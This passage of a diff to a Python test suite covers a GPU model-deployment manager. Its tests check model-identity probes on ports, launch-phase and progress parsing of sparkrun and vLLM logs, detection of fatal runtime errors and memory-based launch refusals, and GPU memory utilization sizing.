+            "%s/v1/models is serving ling-3.0-flash, not %s -- something else "
+            "is already on this port." % (backend_url, expect_model)
+        )
+
+    manager = make_manager(tmp_path, probe=stranger, ready_timeout_s=0.3)
+    d = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8
+    )
+    assert wait_for(lambda: manager.get(d.deployment_id).state is S.FAILED)
+    assert "ling-3.0-flash" in manager.get(d.deployment_id).last_error
+    manager.close()
+
+
+def test_reconcile_retires_a_record_whose_port_holds_a_stranger(tmp_path):
+    """And the restart path, which is where it actually happened.
+
+    Left LAUNCHING the record keeps the same url, the ready-waiter keeps
+    finding a stranger that answers, and the next restart re-adopts it. The
+    probe's own sentence is the reason, so the operator is sent to the server
+    holding the port rather than told their launch is merely slow.
+    """
+    first = make_manager(tmp_path)
+    d = first.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8
+    )
+    assert wait_for(lambda: first.get(d.deployment_id).state is S.READY)
+    first.close()
+
+    def stranger(backend_url, timeout=3.0, expect_model=None):
+        return False, (
+            "%s/v1/models is serving ling-3.0-flash, not %s -- something else "
+            "is already on this port." % (backend_url, expect_model)
+        )
+
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    second = DeploymentManager(
+        FakeAdapter(registry, recipe_dir=tmp_path / "recipes"),
+        registry,
+        state_dir=tmp_path,
+        probe_fn=stranger,
+        port_free_fn=lambda port: True,
+        autostart=False,
+        ready_poll_interval_s=0.01,
+        ready_timeout_s=1.0,
+    )
+    second.reconcile()
+    assert second.get(d.deployment_id).state is S.FAILED
+    assert "ling-3.0-flash" in second.get(d.deployment_id).last_error
+    second.close()
+
+
+def test_the_identity_check_reads_every_model_list_shape():
+    """vLLM, and the llama-server that caused this. Both name what they serve."""
+    vllm = {"data": [{"id": "Qwen2.5-0.5B-Instruct", "root": "Qwen/Qwen2.5-0.5B-Instruct"}]}
+    llama = {"models": [{"name": "ling-3.0-flash", "model": "ling-3.0-flash"}],
+             "data": [{"id": "ling-3.0-flash"}]}
+    assert health.serves(health._names(vllm), "Qwen2.5-0.5B-Instruct")
+    # A runtime reporting the repository path it loaded is agreeing with the
+    # served name, not contradicting it: default_served_name IS that tail.
+    assert health.serves(health._names(vllm), "Qwen/Qwen2.5-0.5B-Instruct")
+    assert not health.serves(health._names(llama), "Qwen2.5-0.5B-Instruct")
+    assert health.serves(health._names(llama), "ling-3.0-flash")
+
+
+def test_a_port_that_names_nothing_is_probed_on_liveness_alone():
+    """Absence of a model list is not evidence of the wrong model.
+
+    A runtime behind a proxy that never spoke this dialect has always been
+    probed on liveness, and this check must not start killing it.
+    """
+    assert health._names({"object": "list"}) == []
+    assert health._names("not json at all") == []
+    assert not health.wrong_model(None)
+    assert not health.wrong_model("http://x/v1/models unreachable: refused")
+    assert health.wrong_model(
+        "http://x/v1/models is serving a, not b -- something else is already "
+        "on this port. Stop that server"
+    )
+
+
 def test_default_served_name_is_the_tail_of_the_model_id():
     assert default_served_name(fx.GPT_OSS_120B) == "gpt-oss-120b"
     assert default_served_name(fx.LLAMA_3_3_70B) == "Llama-3.3-70B-Instruct"
@@ -1755,11 +2538,20 @@ def test_the_rendered_command_is_accepted_by_real_sparkrun(tmp_path):
 
 @needs_sparkrun
 def test_synthesized_recipes_validate_for_every_runtime(tmp_path):
-    for runtime in ("vllm", "sglang"):
+    from control_plane.deploy.flags import SUPPORTED_RUNTIMES
+
+    # Every runtime in the table, not a list typed here: a new one that writes
+    # a recipe sparkrun will not read is exactly what this test is for, and it
+    # can only catch it if it is asked about it.
+    for runtime in SUPPORTED_RUNTIMES:
         adapter = SparkrunAdapter(
             FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / runtime
         )
-        recipe = adapter.recipe_for(fx.pp2_plan(), fx.GPT_OSS_120B, runtime, 32768, 256)
+        # tts is a single process; a two-rank plan is not something it would
+        # ever be launched with (deploy/flags.py::sharding_refusal).
+        plan = fx.single_node_plan() if runtime == "tts" else fx.pp2_plan()
+        shape = fx.AUDIO8_TTS_0_6B if runtime == "tts" else fx.GPT_OSS_120B
+        recipe = adapter.recipe_for(plan, shape, runtime, 32768, 256)
         path = materialize(recipe)
         proc = subprocess.run(
             ["sparkrun", "recipe", "validate", str(path)],
@@ -2132,7 +2924,10 @@ def _fake_probe_records(n):
     return [
         types.SimpleNamespace(
             deployment=types.SimpleNamespace(
-                deployment_id="d-probe-%d" % i, backend_url="http://10.0.0.%d:8100/v1" % i
+                deployment_id="d-probe-%d" % i,
+                backend_url="http://10.0.0.%d:8100/v1" % i,
+                # The watch loop asks the port whether it is serving THIS name.
+                served_name="probe-%d" % i,
             )
         )
         for i in range(n)
@@ -2144,7 +2939,7 @@ def test_concurrently_hanging_probes_share_one_absolute_deadline(tmp_path):
     not eight: a serial per-thread join would accumulate k * deadline."""
     import time as _time
 
-    def hanging_probe(backend_url, timeout=3.0):
+    def hanging_probe(backend_url, timeout=3.0, expect_model=None):
         _time.sleep(12)
         return True, None
 
@@ -2273,3 +3068,789 @@ def test_manual_degrees_reach_both_the_recipe_and_the_command_line(tmp_path):
     # accepted and silently do nothing.
     assert "--tensor-parallel-size {tensor_parallel}" in recipe
     assert "--pipeline-parallel-size {pipeline_parallel}" in recipe
+
+
+# ==========================================================================
+# What a launch is doing while it is doing it.
+#
+# A deployment sits in LAUNCHING from the invocation until the backend
+# answers, which on a first launch is twenty minutes of one unchanging word
+# covering four different slow things. These are the rules that make it four.
+# ==========================================================================
+
+
+def test_the_launcher_and_the_runtime_are_read_for_their_own_phases():
+    """Both halves of the window, from the strings each program really prints.
+
+    sparkrun's are from its installed package, vLLM's from the image this
+    project launches. If either changes wording, this is what notices --
+    which is the whole reason the markers are literals and not a heuristic.
+    """
+    from control_plane.deploy import progress
+
+    pulling = progress.from_launcher(
+        "Pulling image: ghcr.io/spark-arena/dgx-vllm-eugr-nightly:latest..."
+    )
+    assert pulling.phase == "preparing"
+    # Verbatim. The image reference is the part somebody needs to see.
+    assert pulling.status.startswith("Pulling image: ghcr.io/")
+    assert pulling.source == "sparkrun"
+
+    assert progress.from_launcher(
+        "Ensuring model Qwen/Qwen3-4B-AWQ is available locally..."
+    ).phase == "downloading"
+
+    assert progress.from_runtime_log(
+        "INFO [gpu_model_runner.py:2589] Starting to load model Qwen/Qwen3-4B-AWQ..."
+    ).phase == "loading"
+    # Announces that loading finished, so it belongs to what comes next.
+    assert progress.from_runtime_log("Loading weights took 12.34 seconds").phase == "starting"
+    assert progress.from_runtime_log(
+        "INFO Capturing CUDA graphs (mixed prefill-decode, PIECEWISE)"
+    ).phase == "starting"
+
+    # The two things that must NOT happen: a line nobody recognises does not
+    # become a phase, and does not become a caption either.
+    assert progress.from_runtime_log("WARNING: some unrelated tokenizer notice") is None
+    assert progress.from_launcher("") is None
+
+
+def test_a_real_launch_walks_the_ladder_in_order():
+    """The step headers a real `sparkrun run` prints, in the order it prints them.
+
+    Copied off `sparkrun run <recipe> --hosts ... --dry-run --no-follow` on a
+    non-tty, which is how the manager sees it. This is here because the
+    headers a person actually sees and the format strings inside sparkrun's
+    package are two different sets of words -- the first version of this
+    matched only the second, and would have reported `preparing` through a
+    whole launch.
+    """
+    from control_plane.deploy import progress
+
+    printed = [
+        "[1/6] Preparing",
+        "[2/6] Building image",
+        "[3/6] Distributing resources",
+        "  Ensuring model openai/gpt-oss-120b is available locally...",
+        "[4/6] Syncing tuning configs",
+        "[5/6] Launching vllm runtime",
+        "  Step 1/3: Detecting InfiniBand",
+        "  Step 2/3: Launching container",
+        "  Step 3/3: Executing serve command",
+    ]
+    held = None
+    walked = []
+    for line in printed:
+        held = progress.advance(held, progress.from_launcher(line))
+        walked.append(held.phase)
+
+    assert walked[0] == "preparing"
+    assert walked[3] == "downloading"
+    assert walked[-1] == "loading"
+    # Never backwards, whatever order the headers arrive in. "[4/6] Syncing
+    # tuning configs" lands after the weights and would otherwise walk the
+    # ladder back to `preparing`.
+    ranks = [progress.rank(p) for p in walked]
+    assert ranks == sorted(ranks)
+
+
+def test_only_the_shard_loader_reports_a_fraction():
+    """The one measurement in a launch, and the newest frame of it.
+
+    The shard bar is tqdm: its frames arrive `\\r`-separated inside one line,
+    so reading the line naively reports the FIRST frame -- a launch whose bar
+    is stuck at 0% for the whole load.
+    """
+    from control_plane.deploy import progress
+
+    frames = (
+        "Loading safetensors checkpoint shards:   0% Completed | 0/3 [00:00<?, ?it/s]\r"
+        "Loading safetensors checkpoint shards:  33% Completed | 1/3 [00:01<00:02,  1.2s/it]\r"
+        "Loading safetensors checkpoint shards:  67% Completed | 2/3 [00:02<00:01,  1.1s/it]"
+    )
+    reading = progress.from_runtime_log(frames)
+    assert reading.phase == "loading"
+    assert reading.fraction == pytest.approx(2 / 3)
+
+    # Every other phase measures nothing, and nothing here invents one for it.
+    assert progress.from_launcher("Pulling image: x:latest...").fraction is None
+    assert progress.from_runtime_log("Capturing CUDA graphs").fraction is None
+    assert progress.from_runtime_log(
+        "Loading safetensors checkpoint shards: 0/0"
+    ).fraction is None
+
+
+def test_the_only_estimates_are_the_ones_the_work_made_about_itself():
+    """Where "3 minutes left" is allowed to come from.
+
+    Two of a launch's four steps count themselves with a tqdm bar -- the model
+    downloader (`Fetching 16 files`, from huggingface_hub, which sparkrun
+    enables and which reaches us only because the launch output is streamed)
+    and the checkpoint loader. tqdm prints its own remaining time in every
+    frame. The other two steps report no total at all and get no estimate,
+    because one extrapolated here is a number people plan around.
+    """
+    from control_plane.deploy import progress
+
+    fetching = progress.from_launcher(
+        "Fetching 16 files:  19%|#########  | 3/16 [00:45<03:15, 15.0s/it]"
+    )
+    assert fetching.phase == "downloading"
+    assert fetching.fraction == pytest.approx(0.19)
+    assert fetching.eta_s == pytest.approx(195.0)
+
+    shards = progress.from_runtime_log(
+        "Loading safetensors checkpoint shards:  45% Completed | 5/11 [00:12<00:14,  1.2s/it]"
+    )
+    assert shards.eta_s == pytest.approx(14.0)
+    assert progress.from_launcher(
+        "Fetching 4 files:  50%|#####| 2/4 [1:02:11<1:02:11, 3731s/it]"
+    ).eta_s == pytest.approx(3731.0)
+
+    # A bar with nothing to go on yet prints `?`. No estimate is not an
+    # estimate of zero.
+    early = progress.from_launcher("Fetching 16 files:   0%|  | 0/16 [00:00<?, ?it/s]")
+    assert early.eta_s is None
+    assert early.fraction == 0.0
+
+    # One file's percentage is not the download's. Taking whichever bar frame
+    # arrived last would swing the figure between two different questions.
+    assert progress.from_launcher(
+        "model-00001-of-00016.safetensors:  34%|###| 1.35G/3.95G [00:12<00:23, 112MB/s]"
+    ) is None
+
+    # And the steps that count nothing say nothing.
+    assert progress.from_launcher("Pulling image: ghcr.io/x:latest...").eta_s is None
+    assert progress.from_runtime_log("Capturing CUDA graphs").eta_s is None
+
+
+def test_the_launch_log_is_kept_as_it_arrives_and_bar_frames_do_not_fill_it(tmp_path):
+    """The lines behind the sheet's log view, and why they are free.
+
+    They are the same lines the phase classifier is already handed, so keeping
+    them costs nothing -- and asking for them again would cost plenty, because
+    `sparkrun logs` follows and cannot be polled. A download redraws its bar
+    several times a second, so frames of one bar collapse onto each other:
+    without that, a 500-line buffer is a progress bar and nothing else.
+    """
+    probe = FakeProbe(healthy_by_default=False)
+    manager = make_manager(tmp_path, probe=probe)
+    manager.adapter.launch_output = [
+        "[2/6] Building image",
+        "Fetching 16 files:   6%|#  | 1/16 [00:05<01:15, 5.0s/it]",
+        "Fetching 16 files:  12%|##  | 2/16 [00:10<01:10, 5.0s/it]",
+        "Fetching 16 files:  19%|### | 3/16 [00:15<01:05, 5.0s/it]",
+    ]
+    manager.adapter.log_tail = "INFO Starting to load model Qwen/Qwen3-30B..."
+    dep = manager.launch(
+        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
+    )
+
+    assert wait_for(
+        lambda: any(
+            "Starting to load model" in line
+            for line in manager.log_tail(dep.deployment_id)["lines"]
+        )
+    )
+    answer = manager.log_tail(dep.deployment_id)
+    lines = answer["lines"]
+    # From memory, which is what makes it safe for a screen to poll.
+    assert answer["source"] == "buffer"
+    # Both halves of the launch, in the order they happened: the launcher's
+    # output and then the container's, which is one story to a reader.
+    assert lines[0] == "[2/6] Building image"
+    assert lines[-1].endswith("Starting to load model Qwen/Qwen3-30B...")
+    # One bar, at its newest frame -- not three.
+    frames = [line for line in lines if line.startswith("Fetching 16 files")]
+    assert len(frames) == 1
+    assert frames[0].lstrip().startswith("Fetching 16 files:  19%")
+    manager.close()
+
+
+def test_a_phase_never_walks_backwards():
+    """A log tail is a window, not a stream.
+
+    A slow poll can land after the interesting lines scrolled out of it and
+    come back with an older marker. Left alone that un-ticks a step, which
+    reads as something going wrong.
+    """
+    from control_plane.deploy import progress
+
+    loading = progress.LaunchProgress("loading", "1/3", fraction=1 / 3)
+    starting = progress.LaunchProgress("starting", "Capturing CUDA graphs")
+
+    assert progress.advance(loading, starting) is starting
+    assert progress.advance(starting, loading) is starting
+    # Within a phase the newest sentence wins: "2/3" must replace "1/3".
+    later = progress.LaunchProgress("loading", "2/3", fraction=2 / 3)
+    assert progress.advance(loading, later) is later
+    # Nothing read leaves what we had alone.
+    assert progress.advance(loading, None) is loading
+
+
+def test_the_manager_reports_the_phase_while_it_launches_and_stops_after(tmp_path):
+    """End to end: sparkrun's output, then the container log, then silence.
+
+    The manager streams the launch output as it arrives -- the pull and the
+    weights happen inside that one call -- and reads the backend's log while
+    it waits for readiness. Once the deployment is serving there is no phase
+    to report, because a state describes it better than a stale sentence.
+    """
+    probe = FakeProbe(healthy_by_default=False)
+    manager = make_manager(tmp_path, probe=probe)
+    manager.adapter.log_tail = (
+        "INFO Starting to load model Qwen/Qwen2.5-0.5B-Instruct...\n"
+        "Loading safetensors checkpoint shards:  50% Completed | 1/2 [00:01<00:01]"
+    )
+    dep = manager.launch(
+        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
+    )
+
+    # Wait for the runtime to be the one talking. Before the first log read
+    # lands the phase is already `loading` -- the container is up, which is
+    # something we know without being told -- so waiting on the phase alone
+    # would race the read this test is about.
+    assert wait_for(
+        lambda: manager.progress().get(dep.deployment_id, {}).get("source") == "runtime"
+    )
+    reported = manager.progress()[dep.deployment_id]
+    assert reported["phase"] == "loading"
+    # The runtime's own sentence and the runtime's own count, unedited.
+    assert reported["status"].startswith("Loading safetensors checkpoint shards:")
+    assert reported["fraction"] == pytest.approx(0.5)
+
+    probe.healthy_by_default = True
+    assert wait_for(lambda: manager.get(dep.deployment_id).state is S.READY)
+    assert dep.deployment_id not in manager.progress()
+    # And the follower is shut down with it. `sparkrun logs` is a `tail -f`
+    # inside the container; one left running holds an exec session open on the
+    # node for as long as the model is served.
+    assert manager.adapter.streams, "the launch is expected to have followed a log"
+    assert wait_for(lambda: all(s.closed for s in manager.adapter.streams))
+    manager.close()
+
+
+def test_a_runtime_that_dies_inside_a_live_container_fails_the_launch_now():
+    """The thirty-minute failure this box actually produces.
+
+    A solo launch execs the serve command inside a container that sleeps
+    forever. When the engine exits, the container stays up: `check-job` says
+    the workload is running, the port refuses, and the ready wait spends the
+    whole of READY_TIMEOUT_S on a process that has already gone. The record
+    left behind said "backend did not answer within 1800s: connection
+    refused"; the log said the engine refused to start because 49.56 of 121.69
+    GiB were free against a 0.9 utilization target, thirty seconds in.
+    """
+    from control_plane.deploy import progress
+
+    died = progress.from_runtime_log(
+        "(EngineCore pid=350) ERROR 09-07 21:38:43 [core.py:1385] EngineCore "
+        "failed to start."
+    )
+    assert died.fatal is True
+    assert died.status.endswith("EngineCore failed to start.")
+
+    # A death is not a step, so it is not read newest-first with the progress
+    # markers and it is not held back by the ladder either. A shard count
+    # printed after the traceback does not undo the traceback.
+    after = progress.from_runtime_log(
+        "RuntimeError: Engine core initialization failed. See root cause above.\n"
+        "Loading safetensors checkpoint shards:  50% Completed | 1/2"
+    )
+    assert after.fatal is True
+    loading = progress.LaunchProgress("loading", "1/2", fraction=0.5)
+    assert progress.advance(loading, died) is died
+
+    # And nothing merely alarming is fatal. The bar is "this line means the
+    # process is on its way out", not "this line contains the word error".
+    for line in (
+        "ERROR 09-07 21:38:43 [core.py:1385] Traceback (most recent call last):",
+        "WARNING: Unknown vLLM environment variable detected: VLLM_BASE_DIR",
+        "(APIServer pid=93) ERROR ... raise ValueError(",
+    ):
+        reading = progress.from_runtime_log(line)
+        assert reading is None or not reading.fatal, line
+
+
+def test_the_tts_server_announces_its_own_death_and_the_marker_is_one_string():
+    """The same thirty-minute failure, in the runtime this repository writes.
+
+    `runtimes/tts.py` does its whole parse-load-build before `uvicorn.run`, so
+    a checkpoint that does not answer the three calls, a config with no codec,
+    or a `--tp 2` the server refuses all exit with no port ever bound -- and
+    none of the vLLM markers above are printed by a process that is not vLLM.
+    The container goes on sleeping either way.
+
+    The marker is spelled twice on purpose: `progress.py` may not import
+    `runtimes.tts` (torch and transformers are its dependencies and it runs
+    inside a model container), so the copy is checked here instead of trusted.
+    """
+    from control_plane.deploy import progress
+    from control_plane.runtimes import tts
+
+    assert tts.FATAL_MARKER in progress._RUNTIME_FATAL
+
+    died = progress.from_runtime_log(
+        "2026-09-07 21:38:43,001 ERROR derate.tts "
+        + tts.FATAL_MARKER
+        + "\nTraceback (most recent call last):"
+    )
+    assert died.fatal is True
+    assert tts.FATAL_MARKER in died.status
+
+    # The refusal this server makes on purpose reaches the same place: a
+    # single-process runtime handed TP=2 exits with a sentence, and without
+    # the marker that sentence sat in a log nobody read for 1800 seconds.
+    refused = progress.from_runtime_log(
+        "2026-09-07 21:38:43,001 ERROR derate.tts %s --tensor-parallel-size 2: "
+        "this runtime runs one process on one GPU and cannot shard a "
+        "checkpoint." % tts.FATAL_MARKER
+    )
+    assert refused.fatal is True
+
+    # An ordinary line from the same server is not a death. `Uvicorn running
+    # on` is the opposite of one, and it is already a `starting` marker.
+    alive = progress.from_runtime_log(
+        "2026-09-07 21:38:43,001 INFO derate.tts loaded ArkttsModel on cuda:0"
+    )
+    assert alive is None or not alive.fatal
+
+
+def test_the_tts_server_prints_the_marker_before_it_gives_up(caplog, monkeypatch):
+    """Printed by `main`, not merely defined beside it.
+
+    The constant existing is worth nothing if the failure path does not reach
+    it, and the failure path is an except block around three calls -- exactly
+    the kind of thing that survives a refactor by being deleted.
+    """
+    import logging
+
+    from control_plane.runtimes import tts
+
+    def _explode(self):
+        raise RuntimeError("a model without a codec is not one")
+
+    monkeypatch.setattr(tts.SpeechEngine, "load", _explode)
+
+    argv = ["--model", "Audio8/Audio8-TTS-Preview-0.6b", "--trust-remote-code"]
+    with caplog.at_level(logging.ERROR, logger="derate.tts"):
+        with pytest.raises(RuntimeError):
+            tts.main(argv)
+    assert any(tts.FATAL_MARKER in r.getMessage() for r in caplog.records)
+
+    # And the argv refusal, which leaves by SystemExit rather than by raising.
+    caplog.clear()
+    with caplog.at_level(logging.ERROR, logger="derate.tts"):
+        with pytest.raises(SystemExit):
+            tts.main(argv + ["--tensor-parallel-size", "2"])
+    assert any(tts.FATAL_MARKER in r.getMessage() for r in caplog.records)
+
+
+def test_a_config_error_before_enginecore_forks_is_also_fatal():
+    """The failure that slipped past all three EngineCore markers.
+
+    A launch whose `max_model_len` was set past the model's own
+    `max_position_embeddings` never gets as far as EngineCore: pydantic
+    rejects the config inside `create_engine_config`, in the API server
+    process, and the traceback unwinds straight back to the CLI entrypoint's
+    own `sys.exit(main())` frame. None of the three EngineCore-specific
+    literals appear anywhere in it, so before this marker existed the launch
+    would have watched a container that was never going to answer for the
+    full readiness timeout, same as the case above.
+    """
+    from control_plane.deploy import progress
+
+    died = progress.from_runtime_log(
+        "(APIServer pid=93) Traceback (most recent call last):\n"
+        '(APIServer pid=93)   File "/usr/local/bin/vllm", line 10, in <module>\n'
+        "(APIServer pid=93)     sys.exit(main())\n"
+        "(APIServer pid=93) pydantic_core._pydantic_core.ValidationError: 1 "
+        "validation error for ModelConfig\n"
+        "(APIServer pid=93)   Value error, User-specified max_model_len "
+        "(780800) is greater than the derived max_model_len "
+        "(max_position_embeddings=40960.0 or model_max_length=None in "
+        "model's config.json)."
+    )
+    assert died.fatal is True
+
+
+def test_the_manager_stops_waiting_when_the_runtime_says_it_died(tmp_path):
+    """End to end, against a container that is still up.
+
+    `is_running` stays True the whole time -- that is the point -- so before
+    the manager read the log this launch had nothing to fail on until the
+    ready timeout expired half an hour later.
+    """
+    probe = FakeProbe(healthy_by_default=False)
+    manager = make_manager(tmp_path, probe=probe, ready_timeout_s=600.0)
+    manager.adapter.log_tail = (
+        "(EngineCore pid=350) INFO Starting to load model Qwen/Qwen3-30B...\n"
+        "(EngineCore pid=350) ERROR ValueError: Free memory on device cuda:0 "
+        "(49.56/121.69 GiB) on startup is less than desired GPU memory "
+        "utilization (0.9, 109.52 GiB).\n"
+        "(EngineCore pid=350) ERROR EngineCore failed to start."
+    )
+    dep = manager.launch(
+        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
+    )
+
+    # Seconds, against a 600s readiness budget that is still running.
+    assert wait_for(lambda: manager.get(dep.deployment_id).state is S.FAILED, timeout=10.0)
+    assert manager.adapter.is_running(manager.handles()[dep.deployment_id]["cluster_id"])
+
+    # The runtime's own sentence, not "backend did not answer within 600s".
+    failure = manager.get(dep.deployment_id).last_error
+    assert "EngineCore failed to start." in failure
+    # And the memory refusal underneath it reached the calibration event,
+    # which is the whole reason a fit miss is worth catching.
+    assert drain(manager.bus, ev.FIT_MISS), "a startup memory refusal is a fit miss"
+    manager.close()
+
+
+def test_the_startup_memory_refusal_is_recognised_as_a_fit_miss():
+    """The most valuable telemetry this system produces, previously discarded.
+
+    vLLM refusing to start because the pool is smaller than the utilization
+    target never says "out of memory", so it was tagged an ordinary failure --
+    and Agent D learned nothing from the one case its estimate is calibrated
+    by. On GB10 this is the expected shape of a miss: the static ceiling says
+    the model fits and the OS is sharing the same pool.
+    """
+    from control_plane.deploy.sparkrun import is_oom
+
+    assert is_oom(
+        "ValueError: Free memory on device cuda:0 (49.56/121.69 GiB) on startup "
+        "is less than desired GPU memory utilization (0.9, 109.52 GiB). Decrease "
+        "GPU memory utilization or reduce GPU memory used by other processes."
+    )
+    # Still not a catch-all for anything mentioning memory.
+    assert not is_oom("INFO Available KV cache memory: 12.34 GiB")
+
+
+def test_the_compile_cache_is_pointed_somewhere_that_survives_the_container(tmp_path):
+    """The reason a second launch of the same model is not a second cold start.
+
+    sparkrun runs the container with `HOME=/tmp` and `--rm`, and the host's
+    HuggingFace cache is the only writable mount it has. Left alone, vLLM
+    resolves VLLM_CACHE_ROOT under that HOME and every launch recompiles from
+    cold -- minutes, after the download is over, with nothing on screen
+    saying why.
+    """
+    from control_plane.deploy.flags import RUNTIME_CACHE_DIR, runtime_spec
+
+    recipe = recipes.synthesize(
+        fx.GPT_OSS_120B,
+        fx.pp2_plan(),
+        "vllm",
+        32768,
+        256,
+        "gpt-oss-120b",
+        port=8100,
+        gpu_memory_utilization=0.90,
+        recipe_dir=tmp_path / "recipes",
+    ).content
+
+    assert "env:\n" in recipe
+    assert "VLLM_CACHE_ROOT: %s/vllm" % RUNTIME_CACHE_DIR in recipe
+    # Inside the one mount that outlives the container, and beside `hub/`
+    # rather than in it: modelcache.py measures and deletes `hub/models--*`,
+    # and compiled kernels are not weights.
+    assert RUNTIME_CACHE_DIR.startswith("/cache/huggingface/")
+    assert not RUNTIME_CACHE_DIR.startswith("/cache/huggingface/hub")
+
+    # The tts runtime compiles nothing, so it carries no compile-cache
+    # variable -- an unread one pointed at a directory suggests a saving that
+    # is not there. What it does carry is the voice library, which is the same
+    # mechanism used in the other direction: `env:` is the only channel into a
+    # launched container (the recipe format has no `volumes:` key), so a
+    # directory that must outlive one launch is pointed at RUNTIME_CACHE_DIR
+    # whether the runtime writes it or only reads it. The image's own default,
+    # /voices, is a path nothing mounts.
+    tts_env = dict(runtime_spec("tts").cache_env)
+    assert tts_env == {"DERATE_TTS_VOICE_DIR": RUNTIME_CACHE_DIR + "/voices"}
+    assert not any("CACHE_ROOT" in name for name in tts_env)
+    tts = recipes.synthesize(
+        fx.AUDIO8_TTS_0_6B,
+        fx.single_node_plan(),
+        "tts",
+        4096,
+        8,
+        "tts",
+        port=8100,
+        gpu_memory_utilization=0.90,
+        recipe_dir=tmp_path / "recipes",
+    ).content
+    assert "env:\n" in tts
+    assert "DERATE_TTS_VOICE_DIR: %s/voices" % RUNTIME_CACHE_DIR in tts
+
+
+# ==========================================================================
+# What share of the GPU a launch asks for.
+#
+# `--gpu-memory-utilization` is a claim on the whole device, not a limit: the
+# runtime refuses to start unless that share is FREE. A constant 0.90 asks for
+# ninety percent of the machine for a 0.5B model, and on a node with anything
+# else running it fails every time.
+# ==========================================================================
+
+
+def test_the_share_asked_for_is_the_share_the_plan_needs():
+    """Three real failures from the development box, and what stops them.
+
+    Each of these launches died thirty seconds in with `Free memory on device
+    cuda:0 (34.26/120.56 GiB) on startup is less than desired GPU memory
+    utilization (0.9, 108.51 GiB)` -- while the fit gate's own record said
+    `fits`, basis `live`, 1.8 GiB predicted into 24.0 GiB usable. The gate was
+    right; the flag ignored it.
+    """
+    from control_plane.contracts import DEFAULT_GUARDRAIL
+    from control_plane.deploy.utilization import utilization_for
+
+    GIB = 1024**3
+    total = int(120.56 * GIB)
+    free = int(34.26 * GIB)
+
+    # The 0.5B that could not start on a machine with 34 GiB free.
+    tiny = utilization_for(
+        needed_bytes=int(1.8 * GIB), device_total_bytes=total, free_bytes=free
+    )
+    assert tiny * total < free, "must ask for less than is free, or it cannot start"
+    assert tiny < DEFAULT_GUARDRAIL
+
+    # A model that needs most of what is free still gets what it needs.
+    embedding = utilization_for(
+        needed_bytes=int(23.6 * GIB), device_total_bytes=total, free_bytes=free
+    )
+    assert embedding * total >= 23.6 * GIB, "the plan's own budget is the floor"
+    assert embedding * total < free
+
+    # And on an empty machine the guardrail is still the ceiling: this can
+    # only ever ask for less than the old constant, never more.
+    big = utilization_for(
+        needed_bytes=int(200 * GIB), device_total_bytes=total, free_bytes=total
+    )
+    assert big == pytest.approx(DEFAULT_GUARDRAIL)
+
+
+def test_an_unknown_reading_degrades_rather_than_refusing():
+    """The rule the fit gate already follows, applied to the same question.
+
+    A node that has not been sampled has no live total and no free figure. The
+    answer is the guardrail that was there before this existed -- never a
+    fraction computed against a denominator of zero, which is not a smaller
+    request but an arbitrary one.
+    """
+    from control_plane.contracts import DEFAULT_GUARDRAIL
+    from control_plane.deploy.utilization import MIN_UTILIZATION, utilization_for
+
+    GIB = 1024**3
+    assert utilization_for(
+        needed_bytes=GIB, device_total_bytes=0, free_bytes=None
+    ) == DEFAULT_GUARDRAIL
+    assert utilization_for(
+        needed_bytes=0, device_total_bytes=120 * GIB, free_bytes=None
+    ) == DEFAULT_GUARDRAIL
+    # No free reading is not a free reading of zero: the request is sized by
+    # the plan and capped only by the guardrail.
+    unknown = utilization_for(
+        needed_bytes=int(60 * GIB), device_total_bytes=int(120 * GIB), free_bytes=None
+    )
+    assert 0.5 < unknown < DEFAULT_GUARDRAIL
+    # A model far smaller than the floor still gets the floor, so a runtime is
+    # never handed a budget with no room for a KV cache in it.
+    assert utilization_for(
+        needed_bytes=1024, device_total_bytes=int(120 * GIB), free_bytes=int(100 * GIB)
+    ) == MIN_UTILIZATION
+
+
+def test_the_launch_asks_for_what_the_node_can_actually_give(tmp_path):
+    """End to end: the flag that reaches sparkrun, on a busy node.
+
+    The registry reports the node holding 100 of its 120 GiB, which is what a
+    machine with a llama-server and a notebook on it looks like. The rendered
+    command must ask for something that fits in the remaining 20, or the
+    launch is refused by the runtime before it reads a byte of the model.
+    """
+    GIB = 1024**3
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    node = registry.get_node(fx.SPARK_01.node_id)
+    node.memory_total = int(120 * GIB)
+    node.memory_used = int(100 * GIB)
+
+    manager = make_manager(tmp_path, registry=registry, probe=FakeProbe())
+    dep = manager.launch(
+        fx.QWEN3_30B_A3B,
+        fx.single_node_plan(fx.SPARK_01.node_id),
+        fx.fits(),
+        "vllm",
+        8192,
+        64,
+    )
+    assert wait_for(lambda: manager.adapter.launches)
+    argv = manager.adapter.launches[-1]
+    asked = float(argv[argv.index("--gpu-mem") + 1])
+
+    assert asked * 120 * GIB < 20 * GIB, (
+        "asked for %.2f of a 120 GiB node with 20 GiB free" % asked
+    )
+    # The recipe and the command line have to agree: `--gpu-mem` is an
+    # override and wins, so a recipe still carrying the default would be a
+    # file that describes a launch nobody ran.
+    recipe = next(iter((tmp_path / "recipes").glob("*.yaml"))).read_text()
+    assert "gpu_memory_utilization: %.2f" % asked in recipe
+    manager.close()
+    assert dep.state is not None
+
+
+def test_the_whole_of_launching_is_bounded_by_one_ready_timeout(tmp_path):
+    """READY_TIMEOUT_S bounds the state, not each half of it.
+
+    `adapter.launch` carries its own timeout and `_wait_for_ready` used to
+    start a second, independent one after it returned. The two ran back to
+    back and nothing bounded the sum, so a deployment could sit in LAUNCHING
+    for twice READY_TIMEOUT_S -- 1800s of sparkrun and then another 1800s of
+    polling a port that was never going to answer -- while the refusal it
+    finally wrote quoted the single figure. The number in that sentence is
+    the one a person waited out, so it has to be the one that bounds them.
+    """
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
+    # Most of the budget goes to the launcher, the way a cold image pull does.
+    adapter.launch_delay = 0.6
+    manager = DeploymentManager(
+        adapter,
+        registry,
+        state_dir=tmp_path,
+        probe_fn=FakeProbe(healthy_by_default=False),  # the port never answers
